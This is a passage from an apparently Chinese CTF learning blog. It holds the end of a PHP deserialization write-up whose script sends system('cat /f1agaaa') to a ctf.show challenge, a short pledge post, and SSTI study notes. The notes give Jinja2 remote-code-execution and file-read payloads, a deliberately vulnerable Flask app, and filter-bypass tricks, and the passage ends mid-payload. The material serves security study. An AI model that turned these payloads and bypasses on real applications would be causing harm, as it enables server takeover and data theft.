class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>拿到flag</p><p>官方wp是flag文件是不知道的要结合给出的key和move去爆破</p><p>官方解释：</p><p>其中move是移动的意思，猜测这是一个移位的加密，其中猜测key是范围那么就有向左就有3种可能， 向右也有3种可能 但是提示2提示我们random-随机，那么加密可能是2~7随机，那么每次正好相等就是1&#x2F;24的几率</p><p>之后就想办法构造链子触发利用<code>eval</code>函数了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$a</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos -&gt;aaa = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cycycycy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;</span><br><br></code></pre></td></tr></table></figure><p>之后用脚本爆破key就可以了，贴一个官方的脚本 <strong>没懂</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>mi = [<span class="hljs-string">&#x27;i6xstx6d6x6ir&#x27;</span>,<span class="hljs-string">&#x27;u5zarz5s5z5ue&#x27;</span>,<span class="hljs-string">&#x27;y4lpel4a4l4yw&#x27;</span>,<span class="hljs-string">&#x27;sqnhonqjqnqsi&#x27;</span>,<span class="hljs-string">&#x27;dwmjpmwkwmwdo&#x27;</span>,<span class="hljs-string">&#x27;fe1ka1ele1efp&#x27;</span>]<br>d = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> d&lt;<span class="hljs-number">2</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> mi:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;eval&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;cat /f1agaaa&quot;);&#x27;</span><br>        &#125;<br>        url = <span class="hljs-string">f&quot;http://67423f19-3ba4-41b5-9e10-716ce8f5e683.challenge.ctf.show/index.php?get=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span><br>        header = &#123;<br>            <span class="hljs-string">&#x27;aaaaaa&#x27;</span>:<span class="hljs-string">&#x27;O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;&#x27;</span><br>        &#125;<br>        reqpose = requests.post(url=url,data=data,headers=header).text<br>        re_text = re.findall(<span class="hljs-string">r&quot;(?&lt;=&lt;/code&gt;).*&quot;</span>, reqpose, re.S)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> re_text:<br>            <span class="hljs-built_in">print</span>(re_text[<span class="hljs-number">0</span>])<br>            d += <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>php原生类</tag>
      
      <tag>flask加密伪造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>立个flag</title>
    <link href="/tuyi/2025/01/22/%E7%AB%8B%E4%B8%AAflag/"/>
    <url>/tuyi/2025/01/22/%E7%AB%8B%E4%B8%AAflag/</url>
    
    <content type="html"><![CDATA[<p>从今天开始每天写至少一道web题</p>]]></content>
    
    
    
    <tags>
      
      <tag>目标</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模板注入</title>
    <link href="/tuyi/2025/01/15/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/tuyi/2025/01/15/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>一点关于ssti的学习笔记</p><p>不会就试试<strong>fenjing一把梭哈</strong></p><h1 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>、任意命令执行<br>&#123;%<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="hljs-keyword">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br><span class="hljs-number">2</span>、任意命令执行<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br>//这个<span class="hljs-number">138</span>对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload<br><span class="hljs-number">3</span>、任意命令执行<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">4</span>、任意命令执行<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">5</span>、任意命令执行<br>&#123;&#123;config.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">6</span>、文件读取<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">7.</span>任意命令执行<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">8.</span>不出网写静态文件<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo cat /app/flag &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">9.</span>当config是<span class="hljs-literal">None</span>时，尝试读取current_app的config<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br><br></code></pre></td></tr></table></figure><h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><p>获取键值或下标的方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>获取属性的方式</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。<br>&#123;&#123;&#125;&#125;用于将表达式打印到模板输出<br>&#123;##&#125;表示未包含在模板输出中的注释<br>\##可以有和&#123;%%&#125;相同的效果<br></code></pre></td></tr></table></figure>{%set%}拼接<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">c.构造popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> c=dict(po=a,pen=a)|<span class="hljs-name">join</span>%&#125;</span><br></code></pre></td></tr></table></figure><h1 id="1-什么是SSTI模板注入"><a href="#1-什么是SSTI模板注入" class="headerlink" title="1.什么是SSTI模板注入"></a>1.什么是SSTI模板注入</h1><p>SSTI，服务端模板注入，其实也就是模板引擎+注入, 那么我们首先需要了解一下模板引擎</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。也就是html框架</p><p>常见的模板引擎：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">PHP:</span> Smarty, Twig, <span class="hljs-keyword">Blade</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java: </span><span class="hljs-keyword">JSP, </span>FreeMarker, Velocity<br><span class="hljs-symbol">Python:</span> <span class="hljs-keyword">Jinja2, </span>django, tornado<br></code></pre></td></tr></table></figure><p>简单的ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">  &lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="hljs-string">  &lt;/head&gt;</span><br><span class="hljs-string"> &lt;body&gt;</span><br><span class="hljs-string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span><br><span class="hljs-string">  &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>% (name)<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>当我们输入name是可控的,使用的是%S来实现动态的字符串控制，而Flask使用的是jinja2模板，我们可以传入{{}}，`{{}}`在`Jinja2`中作为变量包裹标识符，`Jinja2`在渲染的时候会把{{}}包裹的内容进行解析，就可以执行命令。<h1 id="2-SSTI前置知识"><a href="#2-SSTI前置知识" class="headerlink" title="2.SSTI前置知识"></a>2.SSTI前置知识</h1><p>主要了解一点Python的魔术方法和内置类</p><p><code>__class__</code>用于返回该对象所属的类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;abcd&#x27;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__base__</code>用于获取类的基类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__base__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br>//<span class="hljs-built_in">object</span>为<span class="hljs-built_in">str</span>的基类<br></code></pre></td></tr></table></figure><p><code>__mro__</code>返回解析方法调用的顺序的元组。（当调用_mro_[1]或者-1时作用其实等同于_base_）<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__subclasses__()</code>可以获取类的所有子类的元组<br>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;,&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;...]<br></code></pre></td></tr></table></figure><p><code>__init__</code><br>重载子类，获取子类初始化的属性。</p><p><code>__globals__</code><br>函数会以字典的形式返回当前位置的全部全局变量<br>就比如：<code>os._wrap_close.__init__.__globals__</code>，可以获取到os中的一些函数，进行文件读取</p><h1 id="3-SSTI语句构造"><a href="#3-SSTI语句构造" class="headerlink" title="3.SSTI语句构造"></a>3.SSTI语句构造</h1><p>第一步，拿到当前类，也就是用__class__</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br></code></pre></td></tr></table></figure><p>第二步，拿到基类，这里可以用__base__，也可以用__mro__</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[1]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>第三步，拿到基类的子类，用<code>__subclasses__()</code></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()&#125;&#125;<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, <br></code></pre></td></tr></table></figure><p>接下来的话，就要找可利用的类，寻找那些有回显的或者可以执行命令的类<br>大多数利用的是<code>os._wrap_close</code>这个类，我们这里可以用一个简单脚本来寻找它对应的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8888/?name=\</span><br><span class="hljs-string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>    res = requests.get(url=url, headers=headers)<br>    <span class="hljs-comment">#print(res.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>接下来就可以利用<code>os。_wrap_close</code>，这个类中有<code>popen</code>方法，我们去调用它<br>首先<br>先调用它的__init__方法进行初始化类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__&#125;&#125;<br></code></pre></td></tr></table></figure><p>此时就可以去进行RCE了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>还有一个比较厉害的模块，就是<code>__builtins__</code>,它里面有<code>eval()</code>等函数，我们可以也利用它来进行RCE<br>它的payload是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="4-SSTI常见的绕过方式"><a href="#4-SSTI常见的绕过方式" class="headerlink" title="4.SSTI常见的绕过方式"></a>4.SSTI常见的绕过方式</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过  ."></a>绕过  .</h2><p>当.被ban时，有以下几种绕过方式</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">1、用[]代替.</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>[&#x27;__class&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、用attr()过滤器绕过</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过 _"></a>绕过 _</h2><p>当<code>_</code>被ban时，有以下几种绕过方式</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">1、通过list获取字符列表，然后用pop来获取_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list).pop(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(a)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、可以通过字符编码的方式进行绕过，举个16进制编码例子 可以编码绕过 python解析器支持 hex ，unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()[<span 